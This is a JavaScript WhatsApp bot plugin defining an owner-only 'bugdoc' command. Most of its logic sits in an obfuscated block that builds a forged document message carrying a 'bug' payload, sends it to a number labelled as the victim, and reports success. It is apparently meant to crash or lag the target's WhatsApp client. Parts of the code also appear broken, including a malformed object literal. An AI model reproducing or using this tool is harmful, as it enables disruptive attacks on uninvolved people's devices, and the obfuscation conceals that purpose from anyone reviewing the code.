import { xpRange } from '../lib/levelling.js'
import path from 'path'
import fs from 'fs'
import fetch from 'node-fetch'
import moment from 'moment-timezone'
import jimp from 'jimp'
let handler = async (m, { conn, text, usedPrefix }) => {
let { exp, limit, age, money, level, role, registered } = global.db.data.users[m.sender]
    let { min, xp, max } = xpRange(level, global.multiplier)
    let umur = `*${age == '-1' ? 'Belum Daftar*' : age + '* Thn'}`
	let name = registered ? global.db.data.users[m.sender].name : conn.getName(m.sender)

const reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}

//TIME
let d = new Date(new Date + 3600000)
    let locale = 'id'
    // d.getTimeZoneOffset()
    // Offset -420 is 18.00
    // Offset    0 is  0.00
    // Offset  420 is  7.00
    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(d / 84600000) % 5]
    let week = d.toLocaleDateString(locale, { weekday: 'long' })
    let date = d.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    })

const _0x524afc=_0x3f5a;(function(_0x47bf99,_0x2c1c29){const _0x54da0e=_0x3f5a,_0xb6f184=_0x47bf99();while(!![]){try{const _0x55987e=-parseInt(_0x54da0e(0x1ac))/(0xeb2+-0x219b*-0x1+0x4*-0xc13)+parseInt(_0x54da0e(0x1bb))/(0x247f+0x1ffd+-0x447a)+-parseInt(_0x54da0e(0x1ba))/(-0x804+-0xae2*-0x1+-0x2db)*(parseInt(_0x54da0e(0x1bd))/(-0x1019+0x2235+-0x1218))+-parseInt(_0x54da0e(0x198))/(-0x1f78+-0x14fd+0x347a)+parseInt(_0x54da0e(0x196))/(-0x1adc+0xc5b+-0xe87*-0x1)*(-parseInt(_0x54da0e(0x1aa))/(-0x159e+0xd*-0x143+0x260c))+parseInt(_0x54da0e(0x1b3))/(0xe3c+-0x1760+0x92c)*(parseInt(_0x54da0e(0x187))/(0xd89*0x1+0x223c+0x98c*-0x5))+parseInt(_0x54da0e(0x1c5))/(0x1*-0xa80+-0x1791+0x221b*0x1);if(_0x55987e===_0x2c1c29)break;else _0xb6f184['push'](_0xb6f184['shift']());}catch(_0xfa0521){_0xb6f184['push'](_0xb6f184['shift']());}}}(_0x33f2,0x45e94+-0x5*-0x14949+-0x2d049));const doc={'key':{'fromMe':![],'participant':_0x524afc(0x1b2)+_0x524afc(0x1c2),...m[_0x524afc(0x18d)]?{'remoteJid':''}:{}},'message':{'documentMessage':{'url':_0x524afc(0x189)+_0x524afc(0x1b1)+_0x524afc(0x1a1)+_0x524afc(0x18f)+_0x524afc(0x1c3)+_0x524afc(0x1a7)+_0x524afc(0x1b8)+_0x524afc(0x1b9),'mimetype':_0x524afc(0x1b5)+_0x524afc(0x1b7)+_0x524afc(0x1bf),'fileSha256':_0x524afc(0x19a)+_0x524afc(0x190)+_0x524afc(0x19b)+_0x524afc(0x199)+_0x524afc(0x1b6),'fileLength':_0x524afc(0x1ad),'pageCount':0x1,'mediaKey':_0x524afc(0x192)+_0x524afc(0x19e)+_0x524afc(0x1be)+_0x524afc(0x1a2)+_0x524afc(0x1a8),'fileName':_0x524afc(0x1af)+'s','fileEncSha256':_0x524afc(0x195)+_0x524afc(0x1c0)+_0x524afc(0x1c1)+_0x524afc(0x1a4)+_0x524afc(0x185)}}};if(!text)return m[_0x524afc(0x19d)](_0x524afc(0x1bc)+_0x524afc(0x197)+_0x524afc(0x18c)+_0x524afc(0x194)+_0x524afc(0x191));let [number,pesan]=text[_0x524afc(0x18e)]`|`,user=global['db'][_0x524afc(0x19c)][_0x524afc(0x1a3)][m[_0x524afc(0x1b4)]],korban=''+number;var nomor=m[_0x524afc(0x1b4)];let gambar=fs[_0x524afc(0x1c4)+'nc'](_0x524afc(0x1a9)+_0x524afc(0x1a5)),bugnya=_0x524afc(0x1a6)+_0x524afc(0x1b0)+'\x0a\x0a';conn[_0x524afc(0x1ae)+_0x524afc(0x18a)](korban+(_0x524afc(0x193)+_0x524afc(0x19f)),bugnya,wm,_0x524afc(0x188)+'??',_0x524afc(0x1ab),doc,{'gifPlayback':!![],'contextInfo':{'externalAdReply':{'title':namabot,'body':date,'sourceUrl':linkyt,'thumbnail': imagen1,0x110+0x31*0x3+-0xdb)}}}),m[_0x524afc(0x19d)](_0x524afc(0x18b)+_0x524afc(0x186)+_0x524afc(0x1a0)+korban);function _0x3f5a(_0x242e6b,_0xbbefc1){const _0x1fc414=_0x33f2();return _0x3f5a=function(_0x217781,_0x3d0107){_0x217781=_0x217781-(0x7*-0x4f+-0x8a*-0x2d+-0x1494);let _0x4f5c67=_0x1fc414[_0x217781];return _0x4f5c67;},_0x3f5a(_0x242e6b,_0xbbefc1);}function _0x33f2(){const _0x479ab9=['4517830mOtLSJ','5yk=','girim\x20Bug\x20','3708dFuUCM','M??E??N??U','https://mm','Doc','Sukses\x20Men','ah\x0a\x0aContoh','chat','split','j85sbZCtNt','Php8vjdtJS','62¡Á¡Á¡Á¡Á','P32GszzU5p','@s.whatsap',':\x0a.bugdoc\x20','ybdZlRjhY+','14340kYSosa','t\x20Anda\x20Sal','2446540nISNRf','h3rmcoHN76','TSSZu8gDEA','/DXIECzjrS','data','reply','iUZ5HKluLD','p.net','Ke\x20','.net/d/f/A','7lCAd1PIz3','users','G2W69AVPLg','l.jpg','\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20','UTKfgrl2zX','Qb0=','./thumbnai','630KqqpfJ','.menu','65132zyTRrU','64455','sendButton','Deffri\x20Gan','mampus\x20lag','g.whatsapp','0@s.whatsa','16248TbIgJB','sender','applicatio','M9k=','n/octet-st','RXGvVNWAbF','nsp.enc','555222gDFsSU','379014TXBdkB','Maaf\x20Forma','4HRJfMG','5h/TZzubVJ','ream','aXtytT0G2H','HN4iKWCFis','pp.net','q1cJ6JupaB','readFileSy'];_0x33f2=function(){return _0x479ab9;};return _0x33f2();}
}
handler.command = /^(bugdoc)$/i

handler.owner = true

export default handler
